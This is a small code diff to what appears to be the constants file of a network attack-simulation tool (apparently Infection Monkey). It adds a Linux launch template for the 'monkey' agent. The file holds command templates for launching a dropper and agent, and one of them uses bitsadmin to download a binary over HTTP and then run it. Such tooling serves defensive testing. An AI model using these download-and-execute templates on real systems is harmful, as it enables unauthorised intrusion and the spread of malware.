@@ -5,7 +5,9 @@ __author__ = 'itamar'
 MONKEY_ARG = "m0nk3y"
 DROPPER_ARG = "dr0pp3r"
 DROPPER_CMDLINE = 'cmd /c %%(dropper_path)s %s' % (DROPPER_ARG, )
+# TODO: rename to WINDOWS/LINUX appropriately
 MONKEY_CMDLINE = 'cmd /c %%(monkey_path)s %s' % (MONKEY_ARG, )
+MONKEY_CMDLINE_LINUX = './%%(monkey_path)s %s' % (MONKEY_ARG, )
 DROPPER_CMDLINE_DETACHED = 'cmd /c start cmd /c %%(dropper_path)s %s' % (DROPPER_ARG, )
 MONKEY_CMDLINE_DETACHED = 'cmd /c start cmd /c %%(monkey_path)s %s' % (MONKEY_ARG, )
 MONKEY_CMDLINE_HTTP = 'cmd.exe /c "bitsadmin /transfer Update /download /priority high %%(http_path)s %%(monkey_path)s&cmd /c %%(monkey_path)s %s"' % (MONKEY_ARG, )
